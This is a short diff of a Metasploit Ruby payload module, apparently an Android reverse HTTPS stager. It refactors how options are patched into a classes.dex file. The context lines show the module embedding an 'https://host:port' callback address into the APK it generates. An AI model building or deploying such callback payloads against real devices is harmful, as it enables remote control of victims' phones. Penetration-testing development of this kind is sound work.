@@ -24,11 +24,6 @@ module Metasploit3
       'Handler'       => Msf::Handler::ReverseHttps,
       'Stager'        => {'Payload' => ""}
     ))
-
-    register_options(
-    [
-      OptInt.new('RetryCount', [true, "Number of trials to be made if connection failed", 10])
-    ], self.class)
   end
 
   def generate_jar(opts={})
@@ -40,7 +35,8 @@ module Metasploit3
 
     classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
     string_sub(classes, 'ZZZZ                                ', "ZZZZhttps://" + host + ":" + port)
-    string_sub(classes, 'TTTT                                ', "TTTT" + datastore['RetryCount'].to_s) if datastore['RetryCount']
+    apply_options(classes)
+
     jar.add_file("classes.dex", fix_dex_header(classes))
 
     files = [
